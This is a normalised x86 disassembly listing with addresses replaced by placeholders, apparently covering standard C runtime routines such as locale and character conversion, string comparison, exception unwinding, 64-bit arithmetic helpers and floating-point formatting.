test eax eax
je r-xdata
sub_10024b17
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov eax [ eax + 0x4 ]
push ebx
push esi
push edi
mov edi [ GetLocaleInfoW@IAT ]
xor esi esi
push esi
push esi
push [ ebp + 0x10 ]
mov [ ebp - 0x8 ] eax
push [ ebp + 0xc ]
call edi
mov ecx eax
mov [ ebp - 0xc ] ecx
cmp ecx esi
jne r-xdata
jle r-xdata
xor eax eax
jmp r-xdata
xor ebx ebx
push 0xffffffe0
xor edx edx
pop eax
div ecx
cmp eax 0x2
jb r-xdata
lea esp [ ebp - 0x18 ]
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10016ec3
leave
retn
push [ ebp - 0xc ]
push ebx
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call edi
test eax eax
je r-xdata
lea eax [ ecx + ecx + 0x8 ]
cmp eax 0x400
ja r-xdata
push ebx
call sub_10019f03
pop ecx
mov eax esi
push esi
push esi
cmp [ ebp + 0x18 ] esi
jne r-xdata
push eax
call sub_10019b49
pop ecx
cmp eax esi
je r-xdata
call sub_10021dc0
mov ebx esp
cmp ebx esi
je r-xdata
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push esi
push esi
jmp r-xdata
mov ebx eax
jmp r-xdata
mov [ eax ] 0xdddd
add eax 0x8
mov [ ebx ] 0xcccc
add ebx 0x8
jmp r-xdata
push 0xffffffff
push ebx
push esi
push [ ebp - 0x8 ]
call [ WideCharToMultiByte@IAT ]
mov esi eax
cmp ebx esi
je r-xdata
sub_10024bf1
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x10 ]
call sub_100176e6
push [ ebp + 0x18 ]
lea eax [ ebp - 0x10 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call sub_10024b17
add esp 0x14
cmp [ ebp - 0x4 ] 0x0
je r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_10024c2b
mov edi edi
push ebp
mov ebp esp
sub esp 0x24
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
mov [ ebp - 0x20 ] eax
mov eax [ ebp + 0xc ]
push esi
push edi
mov [ ebp - 0x1c ] eax
call sub_1001bf04
and [ ebp - 0x14 ] 0x0
cmp [ rw-data ] 0x0
mov [ ebp - 0x18 ] eax
jne r-xdata
mov eax [ rw-data ]
mov ecx [ ebp - 0x18 ]
mov esi [ DecodePointer@IAT ]
cmp eax ecx
je r-xdata
push r--data
call [ LoadLibraryW@IAT ]
mov ebx eax
test ebx ebx
je r-xdata
mov eax [ rw-data ]
cmp eax [ ebp - 0x18 ]
je r-xdata
cmp [ rw-data ] ecx
je r-xdata
xor eax eax
mov edi [ GetProcAddress@IAT ]
push r--data
push ebx
call edi
test eax eax
je r-xdata
push [ rw-data ]
call esi
test eax eax
je r-xdata
push eax
call esi
test eax eax
je r-xdata
push eax
call esi
push [ rw-data ]
mov edi eax
call esi
mov ebx eax
test edi edi
je r-xdata
mov esi [ EncodePointer@IAT ]
push eax
call esi
push r--data
push ebx
mov [ rw-data ] eax
call edi
push eax
call esi
push r--data
push ebx
mov [ rw-data ] eax
call edi
push eax
call esi
push r--data
push ebx
mov [ rw-data ] eax
call edi
push eax
call esi
mov [ rw-data ] eax
test eax eax
je r-xdata
push [ ebp + 0x10 ]
push [ ebp - 0x1c ]
push [ ebp - 0x20 ]
push [ ebp - 0x14 ]
call eax
jmp r-xdata
call eax
mov [ ebp - 0x14 ] eax
test eax eax
je r-xdata
test ebx ebx
je r-xdata
push r--data
push ebx
call edi
push eax
call esi
mov [ rw-data ] eax
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10016ec3
leave
retn
mov eax [ rw-data ]
cmp eax [ ebp - 0x18 ]
je r-xdata
call edi
test eax eax
je r-xdata
push eax
call esi
test eax eax
je r-xdata
or [ ebp + 0x10 ] 0x200000
jmp r-xdata
lea ecx [ ebp - 0x24 ]
push ecx
push 0xc
lea ecx [ ebp - 0x10 ]
push ecx
push 0x1
push eax
call ebx
test eax eax
je r-xdata
push [ ebp - 0x14 ]
call eax
mov [ ebp - 0x14 ] eax
test [ ebp - 0x8 ] 0x1
jne r-xdata
sub_10024d97
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push edi
test esi esi
je r-xdata
call sub_10017e85
push 0x16
pop esi
mov [ eax ] esi
mov edi [ ebp + 0xc ]
test edi edi
jne r-xdata
mov ecx [ ebp + 0x10 ]
test ecx ecx
jne r-xdata
mov edx esi
xor eax eax
mov [ esi ] ax
jmp r-xdata
test edi edi
je r-xdata
add edx 0x2
dec edi
jne r-xdata
sub edx ecx
cmp [ edx ] 0x0
je r-xdata
xor eax eax
test edi edi
jne r-xdata
dec edi
jne r-xdata
pop edi
pop esi
pop ebp
retn
mov [ esi ] ax
call sub_10017e85
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
movzx eax [ ecx ]
mov [ edx + ecx ] ax
add ecx 0x2
test ax ax
je r-xdata
call sub_1001b8e4
mov eax esi
sub_10024e0c
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax [ ebp + 0x8 ]
sar eax 0x1
dec eax
pop ebp
retn
sub_10024e27
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push edi
test esi esi
je r-xdata
call sub_10017e85
push 0x16
pop esi
mov [ eax ] esi
mov edi [ ebp + 0xc ]
test edi edi
jne r-xdata
mov eax [ ebp + 0x10 ]
test eax eax
jne r-xdata
mov edx esi
sub edx eax
mov [ esi ] ax
jmp r-xdata
xor eax eax
test edi edi
jne r-xdata
dec edi
jne r-xdata
pop edi
pop esi
pop ebp
retn
mov [ esi ] ax
call sub_10017e85
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
movzx ecx [ eax ]
mov [ edx + eax ] cx
add eax 0x2
test cx cx
je r-xdata
call sub_1001b8e4
mov eax esi
sub_10024e8a
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
test ecx ecx
js r-xdata
call sub_10017e85
mov [ eax ] 0x16
call sub_1001b8e4
or eax 0xffffffff
pop ebp
retn
cmp ecx 0x2
jle r-xdata
mov eax [ rw-data ]
mov [ rw-data ] ecx
pop ebp
retn
cmp ecx 0x3
jne r-xdata
mov eax [ rw-data ]
pop ebp
retn
sub_10024ed0
push ebp
mov ebp esp
push ebx
push esi
push edi
push ebp
push 0x0
push 0x0
push r-xdata
push [ ebp + 0x8 ]
call RtlUnwind
pop ebp
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_10024ef0
mov ecx [ esp + 0x4 ]
test [ ecx + 0x4 ] 0x6
mov eax 0x1
je r-xdata
retn
mov eax [ esp + 0x14 ]
mov ecx [ eax - 0x4 ]
xor ecx eax
call sub_10016ec3
push ebp
mov ebp [ eax + 0x10 ]
mov edx [ eax + 0x28 ]
push edx
mov edx [ eax + 0x24 ]
push edx
call sub_10024f35
add esp 0x8
pop ebp
mov eax [ esp + 0x8 ]
mov edx [ esp + 0x10 ]
mov [ edx ] eax
mov eax 0x3
sub_10024f35
push ebx
push esi
push edi
mov eax [ esp + 0x10 ]
push ebp
push eax
push 0xfffffffe
push sub_10024ef0
push [ fs : 0x0 ]
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x4 ]
mov [ fs : 0x0 ] eax
mov ecx [ esp + 0x4 ]
mov [ fs : 0x0 ] ecx
add esp 0x18
pop edi
pop esi
pop ebx
retn
cmp [ esp + 0x2c ] 0xffffffff
je r-xdata
lea esi [ esi + esi * 2 ]
mov ecx [ ebx + esi * 4 ]
mov [ esp + 0xc ] ecx
mov [ eax + 0xc ] ecx
cmp [ ebx + esi * 4 + 0x4 ] 0x0
jne r-xdata
cmp esi [ esp + 0x2c ]
jbe r-xdata
jmp r-xdata
push 0x101
mov eax [ ebx + esi * 4 + 0x8 ]
call sub_10024fe5
mov eax [ ebx + esi * 4 + 0x8 ]
call sub_10025004
mov eax [ esp + 0x28 ]
mov ebx [ eax + 0x8 ]
mov esi [ eax + 0xc ]
cmp esi 0xffffffff
je r-xdata
sub_10024fdc
push ebx
push ecx
mov ebx rw-data
jmp r-xdata
mov [ ebx + 0x8 ] ecx
mov [ ebx + 0x4 ] eax
mov [ ebx + 0xc ] ebp
push ebp
push ecx
push eax
pop eax
pop ecx
pop ebp
pop ecx
pop ebx
retn 0x4
sub_10024fe5
push ebx
push ecx
mov ebx rw-data
mov ecx [ esp + 0xc ]
mov [ ebx + 0x8 ] ecx
mov [ ebx + 0x4 ] eax
mov [ ebx + 0xc ] ebp
push ebp
push ecx
push eax
pop eax
pop ecx
pop ebp
pop ecx
pop ebx
retn 0x4
sub_10025007
mov edi edi
push ebp
mov ebp esp
mov edx [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
push edi
movzx ecx [ edx ]
lea edi [ ecx - 0x41 ]
inc edx
cmp edi 0x19
ja r-xdata
add eax 0x20
test eax eax
je r-xdata
add ecx 0x20
pop edi
sub eax ecx
pop esi
pop ebp
retn
cmp eax ecx
je r-xdata
movzx eax [ esi ]
lea ecx [ eax - 0x41 ]
inc esi
cmp ecx 0x19
ja r-xdata
sub_10025040
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push [ ebp + 0x10 ]
lea ecx [ ebp - 0x10 ]
call sub_100176e6
mov ebx [ ebp + 0x8 ]
test ebx ebx
jne r-xdata
push esi
mov esi [ ebp + 0xc ]
test esi esi
jne r-xdata
call sub_10017e85
mov [ eax ] 0x16
call sub_1001b8e4
cmp [ ebp - 0x4 ] bl
je r-xdata
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x14 ] 0x0
jne r-xdata
call sub_10017e85
mov [ eax ] 0x16
call sub_1001b8e4
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax 0x7fffffff
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
sub ebx esi
push edi
push esi
push ebx
call sub_10025007
pop ecx
pop ecx
jmp r-xdata
mov eax 0x7fffffff
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
pop ebx
leave
retn
sub edi eax
mov eax edi
pop edi
cmp edi eax
je r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
pop esi
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
movzx eax [ ebx + esi ]
lea ecx [ ebp - 0x10 ]
push ecx
push eax
call sub_1001afb0
mov edi eax
movzx eax [ esi ]
lea ecx [ ebp - 0x10 ]
push ecx
push eax
call sub_1001afb0
add esp 0x10
inc esi
test edi edi
je r-xdata
sub_10025100
mov edi edi
push ebp
mov ebp esp
xor eax eax
cmp [ rw-data ] eax
jne r-xdata
push eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_10025040
add esp 0xc
pop ebp
retn
cmp [ ebp + 0x8 ] eax
jne r-xdata
cmp [ ebp + 0xc ] eax
je r-xdata
call sub_10017e85
mov [ eax ] 0x16
call sub_1001b8e4
mov eax 0x7fffffff
pop ebp
retn
pop ebp
jmp sub_10025007
sub_1002515d
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
cmp [ ebp + 0x10 ] 0x0
push ebx
push esi
push edi
je r-xdata
xor eax eax
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x10 ]
call sub_100176e6
mov ebx [ ebp + 0x8 ]
test ebx ebx
jne r-xdata
mov esi [ ebp + 0xc ]
test esi esi
je r-xdata
call sub_10017e85
mov [ eax ] 0x16
call sub_1001b8e4
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov edi 0x7fffffff
cmp [ ebp + 0x10 ] edi
jbe r-xdata
mov eax 0x7fffffff
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x14 ] 0x0
jne r-xdata
call sub_10017e85
mov [ eax ] 0x16
call sub_1001b8e4
cmp [ ebp - 0x4 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
sub ebx esi
push [ ebp + 0x10 ]
push esi
push ebx
call sub_100270f0
add esp 0xc
mov eax edi
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
sub edi eax
mov eax edi
jmp r-xdata
test edi edi
je r-xdata
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
cmp edi eax
je r-xdata
movzx eax [ ebx + esi ]
lea ecx [ ebp - 0x10 ]
push ecx
push eax
call sub_1001afb0
mov edi eax
movzx eax [ esi ]
lea ecx [ ebp - 0x10 ]
push ecx
push eax
call sub_1001afb0
add esp 0x10
inc esi
dec [ ebp + 0x10 ]
je r-xdata
sub_1002523f
mov edi edi
push ebp
mov ebp esp
xor eax eax
cmp [ rw-data ] eax
jne r-xdata
push eax
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1002515d
add esp 0x10
pop ebp
retn
cmp [ ebp + 0x8 ] eax
jne r-xdata
cmp [ ebp + 0xc ] eax
je r-xdata
call sub_10017e85
mov [ eax ] 0x16
call sub_1001b8e4
mov eax 0x7fffffff
pop ebp
retn
cmp [ ebp + 0x10 ] 0x7fffffff
ja r-xdata
pop ebp
jmp sub_100270f0
sub_100252a0
push ecx
lea ecx [ esp + 0x4 ]
sub ecx eax
sbb eax eax
not eax
and ecx eax
mov eax esp
and eax 0xfffff000
sub eax 0x1000
test [ eax ] eax
jmp r-xdata
mov eax ecx
pop ecx
xchg esp eax
mov eax [ eax ]
mov [ esp ] eax
retn
cmp ecx eax
jb r-xdata
sub_100252d0
push ebp
mov ebp esp
push edi
mov edi [ ebp + 0x8 ]
xor eax eax
or ecx 0xffffffff
[ edi ]
add ecx 0x1
neg ecx
sub edi 0x1
mov al [ ebp + 0xc ]
std
[ edi ]
add edi 0x1
cmp [ edi ] al
je r-xdata
mov eax edi
xor eax eax
jmp r-xdata
cld
pop edi
leave
retn
sub_100252fd
mov edi edi
push ebp
mov ebp esp
sub esp 0x28
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
push [ ebp + 0x10 ]
mov edi [ ebp + 0xc ]
lea ecx [ ebp - 0x24 ]
call sub_100176e6
lea eax [ ebp - 0x24 ]
push eax
xor ebx ebx
push ebx
push ebx
push ebx
push ebx
push edi
lea eax [ ebp - 0x28 ]
push eax
lea eax [ ebp - 0x10 ]
push eax
call sub_10026259
mov [ ebp - 0x14 ] eax
lea eax [ ebp - 0x10 ]
push esi
push eax
call sub_100257b7
add esp 0x28
test [ ebp - 0x14 ] 0x3
jne r-xdata
test [ ebp - 0x14 ] 0x1
jne r-xdata
cmp eax 0x1
jne r-xdata
cmp [ ebp - 0x18 ] bl
je r-xdata
test [ ebp - 0x14 ] 0x2
jne r-xdata
cmp eax 0x2
jne r-xdata
cmp [ ebp - 0x18 ] bl
je r-xdata
push 0x4
jmp r-xdata
mov eax [ ebp - 0x1c ]
and [ eax + 0x70 ] 0xfffffffd
cmp [ ebp - 0x18 ] bl
je r-xdata
push 0x3
mov eax [ ebp - 0x1c ]
and [ eax + 0x70 ] 0xfffffffd
pop eax
jmp r-xdata
xor eax eax
mov eax [ ebp - 0x1c ]
and [ eax + 0x70 ] 0xfffffffd
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10016ec3
leave
retn
sub_100253a5
mov edi edi
push ebp
mov ebp esp
sub esp 0x28
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
push [ ebp + 0x10 ]
mov edi [ ebp + 0xc ]
lea ecx [ ebp - 0x24 ]
call sub_100176e6
lea eax [ ebp - 0x24 ]
push eax
xor ebx ebx
push ebx
push ebx
push ebx
push ebx
push edi
lea eax [ ebp - 0x28 ]
push eax
lea eax [ ebp - 0x10 ]
push eax
call sub_10026259
mov [ ebp - 0x14 ] eax
lea eax [ ebp - 0x10 ]
push esi
push eax
call sub_10025d08
add esp 0x28
test [ ebp - 0x14 ] 0x3
jne r-xdata
test [ ebp - 0x14 ] 0x1
jne r-xdata
cmp eax 0x1
jne r-xdata
cmp [ ebp - 0x18 ] bl
je r-xdata
test [ ebp - 0x14 ] 0x2
jne r-xdata
cmp eax 0x2
jne r-xdata
cmp [ ebp - 0x18 ] bl
je r-xdata
push 0x4
jmp r-xdata
mov eax [ ebp - 0x1c ]
and [ eax + 0x70 ] 0xfffffffd
cmp [ ebp - 0x18 ] bl
je r-xdata
push 0x3
mov eax [ ebp - 0x1c ]
and [ eax + 0x70 ] 0xfffffffd
pop eax
jmp r-xdata
xor eax eax
mov eax [ ebp - 0x1c ]
and [ eax + 0x70 ] 0xfffffffd
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10016ec3
leave
retn
sub_1002544d
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x14 ]
push ebx
mov ebx [ ecx + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
xor eax eax
cmp esi eax
jne r-xdata
cmp [ ebp + 0xc ] eax
jbe r-xdata
call sub_10017e85
push 0x16
pop esi
mov [ eax ] esi
mov edx [ ebp + 0x10 ]
mov [ esi ] al
cmp edx eax
jle r-xdata
pop esi
pop ebx
pop ebp
retn
inc eax
cmp [ ebp + 0xc ] eax
ja r-xdata
mov eax edx
push edi
lea edi [ esi + 0x1 ]
mov [ esi ] 0x30
mov eax edi
test edx edx
jle r-xdata
call sub_10017e85
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
mov [ eax ] 0x0
test edx edx
js r-xdata
mov cl [ ebx ]
test cl cl
je r-xdata
call sub_1001b8e4
mov eax esi
jmp r-xdata
cmp [ esi ] 0x31
jne r-xdata
cmp [ ebx ] 0x35
jl r-xdata
push 0x30
pop ecx
movsx ecx cl
inc ebx
jmp r-xdata
push edi
call sub_10018330
inc eax
push eax
push edi
push esi
call sub_10017050
add esp 0x10
inc [ ecx + 0x4 ]
jmp r-xdata
jmp r-xdata
mov ecx [ ebp + 0x14 ]
mov [ eax ] cl
inc eax
dec edx
test edx edx
jg r-xdata
xor eax eax
pop edi
dec eax
cmp [ eax ] 0x39
je r-xdata
mov [ eax ] 0x30
inc [ eax ]
sub_10025500
mov edi edi
push ebp
mov ebp esp
push ecx
mov ecx [ ebp + 0xc ]
movzx eax [ ecx + 0x6 ]
push ebx
mov ebx eax
shr ebx 0x4
and eax 0x8000
push esi
mov edx 0x7ff
and ebx edx
push edi
mov [ ebp + 0xc ] eax
mov eax [ ecx + 0x4 ]
mov ecx [ ecx ]
movzx edi bx
mov esi 0x80000000
and eax 0xfffff
mov [ ebp - 0x4 ] esi
test edi edi
je r-xdata
xor edx edx
cmp eax edx
jne r-xdata
cmp edi edx
je r-xdata
add ebx 0x3c01
mov [ ebp - 0x4 ] edx
cmp ecx edx
jne r-xdata
mov edi 0x7fff
jmp r-xdata
add ebx 0x3c00
jmp r-xdata
mov [ eax ] ecx
mov [ eax + 0x4 ] edx
test esi edx
je r-xdata
mov eax [ ebp + 0x8 ]
mov cx [ ebp + 0xc ]
mov [ eax + 0x4 ] edx
mov [ eax ] edx
jmp r-xdata
mov edx ecx
shr edx 0x15
shl eax 0xb
or edx eax
or edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
shl ecx 0xb
jmp r-xdata
movzx edi bx
mov ecx [ eax ]
mov ebx ecx
shr ebx 0x1f
add edx edx
or edx ebx
add ecx ecx
add edi 0xffff
mov ecx [ ebp + 0xc ]
or ecx edi
pop edi
pop esi
mov [ eax + 0x8 ] cx
pop ebx
leave
retn
sub_100255b3
mov edi edi
push ebp
mov ebp esp
sub esp 0x30
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x14 ]
push ebx
mov ebx [ ebp + 0x10 ]
push esi
mov [ ebp - 0x24 ] eax
push edi
lea eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x30 ]
push eax
call sub_10025500
pop ecx
pop ecx
lea eax [ ebp - 0x20 ]
push eax
push 0x0
push 0x11
sub esp 0xc
lea esi [ ebp - 0x30 ]
mov edi esp
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsw [ edi ] [ esi ]
call sub_10027151
mov esi [ ebp - 0x24 ]
mov [ ebx + 0x8 ] eax
movsx eax [ ebp - 0x1e ]
mov [ ebx ] eax
movsx eax [ ebp - 0x20 ]
mov [ ebx + 0x4 ] eax
lea eax [ ebp - 0x1c ]
push eax
push [ ebp + 0x18 ]
push esi
call sub_1001b438
add esp 0x24
test eax eax
jne r-xdata
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_1001b892
int3
mov ecx [ ebp - 0x4 ]
pop edi
mov [ ebx + 0xc ] esi
pop esi
mov eax ebx
xor ecx ebp
pop ebx
call sub_10016ec3
leave
retn
sub_10025650
push edi
push esi
push ebp
xor edi edi
xor ebp ebp
mov eax [ esp + 0x14 ]
or eax eax
jge r-xdata
mov eax [ esp + 0x1c ]
or eax eax
jge r-xdata
inc edi
inc ebp
mov edx [ esp + 0x10 ]
neg eax
neg edx
sbb eax 0x0
mov [ esp + 0x14 ] eax
mov [ esp + 0x10 ] edx
or eax eax
jne r-xdata
inc edi
mov edx [ esp + 0x18 ]
neg eax
neg edx
sbb eax 0x0
mov [ esp + 0x1c ] eax
mov [ esp + 0x18 ] edx
mov ebx eax
mov ecx [ esp + 0x18 ]
mov edx [ esp + 0x14 ]
mov eax [ esp + 0x10 ]
mov ecx [ esp + 0x18 ]
mov eax [ esp + 0x14 ]
xor edx edx
div ecx
mov ebx eax
mov eax [ esp + 0x10 ]
div ecx
mov esi eax
mov eax ebx
mul [ esp + 0x18 ]
mov ecx eax
mov eax esi
mul [ esp + 0x18 ]
add edx ecx
jmp r-xdata
shr ebx 0x1
rcr ecx 0x1
shr edx 0x1
rcr eax 0x1
or ebx ebx
jne r-xdata
div ecx
mov esi eax
mul [ esp + 0x1c ]
mov ecx eax
mov eax [ esp + 0x18 ]
mul esi
add edx ecx
jb r-xdata
sub eax [ esp + 0x10 ]
sbb edx [ esp + 0x14 ]
dec ebp
jns r-xdata
dec esi
sub eax [ esp + 0x18 ]
sbb edx [ esp + 0x1c ]
cmp edx [ esp + 0x14 ]
ja r-xdata
mov ecx edx
mov edx ebx
mov ebx ecx
mov ecx eax
mov eax esi
dec edi
jne r-xdata
neg edx
neg eax
sbb edx 0x0
jb r-xdata
pop ebp
pop esi
pop edi
retn 0x10
neg edx
neg eax
sbb edx 0x0
xor ebx ebx
cmp eax [ esp + 0x10 ]
jbe r-xdata
sub_10025730
cmp cl 0x40
jae r-xdata
xor eax eax
xor edx edx
retn
cmp cl 0x20
jae r-xdata
mov eax edx
xor edx edx
and cl 0x1f
shr eax cl
retn
shrd eax edx cl
shr edx cl
retn
sub_10025758
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
mov ecx [ ebp + 0xc ]
and eax 0xfff7ffff
and ecx eax
push esi
mov esi [ ebp + 0x8 ]
test ecx 0xfcf0fce0
je r-xdata
push eax
push [ ebp + 0xc ]
test esi esi
je r-xdata
test esi esi
je r-xdata
call sub_10027b77
call sub_10027b77
mov [ esi ] eax
jmp r-xdata
call sub_10017e85
push 0x16
pop esi
mov [ eax ] esi
call sub_1001b8e4
mov eax esi
jmp r-xdata
push 0x0
push 0x0
call sub_10027b77
pop ecx
pop ecx
mov [ esi ] eax
pop ecx
pop ecx
xor eax eax
pop esi
pop ebp
retn
sub_100257b7
mov edi edi
push ebp
mov ebp esp
sub esp 0x38
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
mov [ ebp - 0x34 ] ecx
movzx ecx [ eax + 0xa ]
push ebx
mov ebx ecx
and ecx 0x8000
mov [ ebp - 0x38 ] ecx
mov ecx [ eax + 0x6 ]
mov [ ebp - 0x10 ] ecx
mov ecx [ eax + 0x2 ]
movzx eax [ eax ]
and ebx 0x7fff
sub ebx 0x3fff
shl eax 0x10
push edi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] eax
cmp ebx 0xffffc001
jne r-xdata
and [ ebp - 0x24 ] 0x0
push esi
lea esi [ ebp - 0x10 ]
lea edi [ ebp - 0x1c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov edi [ rw-data ]
dec edi
lea eax [ edi + 0x1 ]
cdq
and edx 0x1f
add eax edx
sar eax 0x5
lea edx [ edi + 0x1 ]
and edx 0x8000001f
mov [ ebp - 0x2c ] ebx
mov [ ebp - 0x28 ] eax
jns r-xdata
xor ebx ebx
xor eax eax
lea esi [ ebp + eax * 4 - 0x10 ]
push 0x1f
xor eax eax
pop ecx
sub ecx edx
inc eax
shl eax cl
mov [ ebp - 0x30 ] ecx
test [ esi ] eax
je r-xdata
dec edx
or edx 0xffffffe0
inc edx
xor eax eax
lea edi [ ebp - 0x10 ]
stosd [ edi ]
stosd [ edi ]
push 0x2
stosd [ edi ]
pop eax
jmp r-xdata
inc eax
cmp eax 0x3
jl r-xdata
mov ecx [ ebp - 0x30 ]
or eax 0xffffffff
shl eax cl
push 0x3
pop ecx
and [ esi ] eax
mov eax [ ebp - 0x28 ]
inc eax
cmp eax ecx
jge r-xdata
mov eax [ ebp - 0x28 ]
or edx 0xffffffff
shl edx cl
not edx
test [ ebp + eax * 4 - 0x10 ] edx
jmp r-xdata
push 0x1f
pop ecx
sub ecx [ rw-data ]
shl ebx cl
mov ecx [ ebp - 0x38 ]
neg ecx
sbb ecx ecx
and ecx 0x80000000
or ebx ecx
mov ecx [ rw-data ]
or ebx [ ebp - 0x10 ]
cmp ecx 0x40
jne r-xdata
cmp [ ebp + eax * 4 - 0x10 ] ebx
jne r-xdata
xor eax eax
jmp r-xdata
cmp [ ebp - 0x24 ] 0x0
je r-xdata
lea edi [ ebp + eax * 4 - 0x10 ]
sub ecx eax
xor eax eax
[ edi ]
jne r-xdata
cmp ecx 0x20
jne r-xdata
mov ecx [ ebp - 0x34 ]
mov edx [ ebp - 0xc ]
mov [ ecx + 0x4 ] ebx
mov [ ecx ] edx
jmp r-xdata
mov eax [ rw-data ]
mov ecx eax
sub ecx [ rw-data ]
cmp ebx ecx
jge r-xdata
inc ebx
mov eax edi
cdq
push 0x1f
pop ecx
and edx ecx
add eax edx
sar eax 0x5
and edi 0x8000001f
jns r-xdata
inc eax
cmp eax 0x3
jl r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop ebx
call sub_10016ec3
leave
retn
mov ecx [ ebp - 0x34 ]
mov [ ecx ] ebx
cmp ebx eax
jg r-xdata
xor eax eax
lea edi [ ebp - 0x10 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
jmp r-xdata
and [ ebp - 0x24 ] 0x0
sub ecx edi
xor edx edx
inc edx
shl edx cl
lea ecx [ ebp + eax * 4 - 0x10 ]
mov edi [ ecx ]
add edi edx
mov [ ebp - 0x20 ] edi
mov edi [ ecx ]
cmp [ ebp - 0x20 ] edi
jb r-xdata
dec edi
or edi 0xffffffe0
inc edi
cmp [ ebp + eax * 4 - 0x10 ] 0x0
jmp r-xdata
mov ecx [ rw-data ]
cmp ebx [ rw-data ]
jl r-xdata
sub eax [ ebp - 0x2c ]
lea esi [ ebp - 0x1c ]
mov ecx eax
lea edi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
cdq
and edx 0x1f
add eax edx
movsd [ edi ] [ esi ]
mov edx ecx
sar eax 0x5
and edx 0x8000001f
movsd [ edi ] [ esi ]
jns r-xdata
push 0x2
xor ebx ebx
pop eax
jmp r-xdata
mov [ ebp - 0x24 ] 0x1
cmp [ ebp - 0x20 ] edx
jmp r-xdata
add ebx [ rw-data ]
and [ ebp - 0x10 ] 0x7fffffff
mov eax ecx
cdq
and edx 0x1f
add eax edx
mov edx ecx
sar eax 0x5
and edx 0x8000001f
jns r-xdata
xor eax eax
lea edi [ ebp - 0x10 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
or [ ebp - 0x10 ] 0x80000000
mov eax ecx
cdq
and edx 0x1f
add eax edx
mov edx ecx
sar eax 0x5
and edx 0x8000001f
jns r-xdata
and [ ebp - 0x28 ] 0x0
and [ ebp - 0x20 ] 0x0
or edi 0xffffffff
mov ecx edx
shl edi cl
mov [ ebp - 0x24 ] 0x20
sub [ ebp - 0x24 ] edx
not edi
dec edx
or edx 0xffffffe0
inc edx
pop esi
test ecx ecx
je r-xdata
mov [ ebp - 0x24 ] ecx
jae r-xdata
and [ ebp - 0x28 ] 0x0
and [ ebp - 0x20 ] 0x0
or esi 0xffffffff
mov ecx edx
shl esi cl
mov [ ebp - 0x24 ] 0x20
sub [ ebp - 0x24 ] edx
not esi
